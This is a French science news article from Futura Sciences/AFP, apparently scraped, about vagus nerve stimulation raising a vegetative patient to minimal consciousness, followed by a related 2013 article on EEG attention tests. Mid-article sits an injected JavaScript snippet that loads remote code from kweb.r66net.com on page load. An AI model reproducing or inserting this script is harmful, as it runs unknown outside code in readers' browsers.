{"title": "Stimulation nerveuse : un patient en etat vegetatif montre des signes de conscience", "newspaper": "Futura Sciences", "author": ["AFP"], "date_publi": "2017-09-26", "content": "Des chercheurs francais ont augmente l'etat de conscience d'un homme de 35 ans qui se trouvait dans un etat vegetatif depuis quinze ans. Pour cela, ils ont utilise une stimulation nerveuse du nerf vague. Ce qu'il faut retenir Le patient etait dans un etat vegetatif suite a un accident survenu il y a quinze ans. Son nerf vague a ete stimule grace a un implant thoracique. L'homme a reagi a des stimuli, ce qui suggere un etat de conscience minimal. L'annonce, parue dans le journal americain  Current Biology ,  est basee sur un seul patient, mais les chercheurs envisagent d'etendre le traitement a d'autres au vu des ameliorations chez cet homme, victime d'un accident de la route il y a quinze ans. << La plasticite cerebrale et la reparation du  cerveau  sont possibles, meme lorsque l'espoir semble avoir disparu >> , explique Angela Sirigu, chercheuse a l'Institut des sciences cognitives Marc-Jeannerod, de Lyon.  << Il est possible d'ameliorer la presence d'un patient dans le monde qui l'entoure >> , ajoute-t-elle. \" Il est possible d'ameliorer la presence d'un patient dans le monde qui l'entoure. Le traitement consiste a utiliser un implant thoracique pour envoyer des impulsions electriques dans le nerf vague, ou nerf pneumogastrique, qui relie le cerveau a d'autres organes majeurs du corps. La stimulation du nerf vague est deja utilisee pour traiter les personnes atteintes d'epilepsie et de depression. Le nerf vague a ete stimule par un implant thoracique. (c) chombosan, Fotolia                               Le patient reagit a des stimuli Apres un mois de stimulation nerveuse, le patient a montre des ameliorations significatives dans l'attention, le mouvement et l'activite cerebrale, selon les chercheurs. Il a commence a repondre a des demandes simples, telles que suivre un objet avec ses yeux et tourner la tete. Il a egalement semble plus alerte et capable de rester eveille lorsque son therapeute lui lisait un livre. Il a reagi a des stimuli menacants (ouvrant les yeux en grand quand un examinateur placait soudainement son visage au-dessus du sien) d'une maniere qui n'avait pas ete observee depuis plusieurs annees.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Cependant, le traitement ne lui a pas permis de retrouver son etat de conscience initial. Pour les chercheurs, le patient est passe d'un etat vegetatif a un  << etat de conscience minimale >> , sur la base des scans cerebraux qui ont montre des ameliorations dans les zones du cerveau impliquees dans le mouvement, la sensation et la conscience. Cela signifie que  << la conscience demeure severement alteree. Toutefois, contrairement a l'etat vegetatif, il existe des signes comportementaux minimums mais confirmes de la conscience de soi et de son environnement >> , a explique Tom Manly, un expert en sciences de la connaissance et du cerveau a l'universite de Cambridge. << Ce pourrait etre une nouvelle avancee interessante, mais je serais prudent avec ces resultats jusqu'a ce qu'ils soient reproduits chez plus de patients >> , a ajoute Vladimir Litvak, professeur a l' University College London Institute of Neurology .  << Il est difficile de connaitre sur la base d'un seul cas, la probabilite pour que ce traitement fonctionne de maniere generalisee sur d'autres patients. >> Pour en savoir plus Un patient dans un etat << vegetatif >> capable de rester attentif Article de Janlou Chaput paru le 7 novembre 2013 Une etude menee sur 21 patients en etat << vegetatif >> ou a un niveau de conscience minimale a revele que l'un d'entre eux etait capable de focaliser son attention sur les mots qu'on lui avait demande de reperer. Y aurait-il la possibilite de developper un outil pour etablir la communication entre ces malades et le monde exterieur ? Les  traumatismes craniens  laissent parfois la victime entre la vie et la mort. Completement inanimee ou presque (les membres et les paupieres peuvent encore bouger, mais sans action volontaire du sujet), celle-ci plonge dans une situation ou ses fonctions vitales sont encore assurees, ce qui la maintient en vie, tandis qu'elle demeure dans l'incapacite de communiquer. Pendant longtemps, les medecins ont parle d' etat vegetatif , pensant que l'esprit s'en etait alle. Pourtant, des etudes menees ces dernieres annees ont montre que ces patients pouvaient encore manifester un certain niveau de  conscience . Des Britanniques de l' universite de Cambridge  ont par exemple montre en 2006 qu'une personne plongee dans cet etat pouvait repondre par oui ou par non en stimulant des profils d'activation cerebrale differents, observes par  IRMf . Depuis donc, la terminologie a evolue, et l'on parle plus volontiers de <<  syndrome  d'eveil non repondant >>. Une nouvelle fois, cette equipe de chercheurs, impliquee dans un vaste projet de recherche commence en 1998 et visant a etablir des outils de  diagnostic  et de  pronostic  a partir de l' imagerie cerebrale , est parvenue a obtenir des reponses inattendues de la part d'un de ces patients. Ils ont publie ces resultats dans la revue  NeuroImage : Clinical . Un patient inanime qui joue au tennis Quelque 21 patients en situation de conscience minimale ou de syndrome d'eveil non repondant ont ete soumis a un  electroencephalogramme  pendant qu'on les faisait participer a un exercice dont on avait explique les consignes. En parallele, 8 personnes en bonne sante ont realise la meme tache, pour faire office de controle. L'electroencephalographie consiste a poser des electrodes sur des endroits precis afin d'etudier les variations dans l'activite electrique du cerveau. (c) Petter Kallioinen, Wikipedia, CC by-sa 3.0                               Les differents participants entendaient une serie de 90 a 100 mots prononces par une voix feminine en l'espace de 90 s. On leur demandait de noter dans leur tete chaque occurrence des mots oui et non ( yes  et  no ), qui etaient recites au moins une vingtaine de fois lors de chaque session, sachant que cette tache leur etait demandee a 20 reprises. Pour un des patients, les images de l' activite cerebrale  recoltees sont semblables a celles obtenues pour les membres du groupe controle. Autrement dit, cette personne a ete capable de comprendre les consignes et de filtrer tous les mots qu'on lui avait demande de distinguer des autres. L'experience s'est meme poursuivie au-dela pour lui, car face a cet etat de conscience, les chercheurs lui ont demande de s'imaginer en train de jouer au tennis alors que son  cerveau  etait observe sous IRMF. Et l'imagerie a revele que ce sujet etait bien en train de se concentrer sur cette activite. Communiquer avec l'exterieur Autre resultat observe : trois patients en etat de conscience minimale ont semble manifester de l'attention a l'ecoute de mots inconnus. En revanche, ils n'ont pas reussi l'exercice demande.  Tristan Bekinschtein, l'un des auteurs de ce travail, explique que les etudes cognitives recentes montrent qu'il existe deux niveaux d' attention  : celle qui s'active face a une situation etrange ou nouvelle, et celle que l'on choisit de focaliser. Ce premier patient etait clairement dans ce second cas de figure, et a manifeste un etat de conscience. Les trois autres se limitent, semble-t-il, a cette premiere situation. De ces recherches, les scientifiques esperent progressivement developper un outil pour ameliorer la communication et permettre aux personnes souffrant du  syndrome d'eveil non repondant  de s'exprimer davantage, au moins pour expliciter clairement leurs souhaits afin d'ameliorer leur bien-etre. La route est certes encore longue, mais elle vaut la peine d'etre empruntee. ", "theme": "sante"}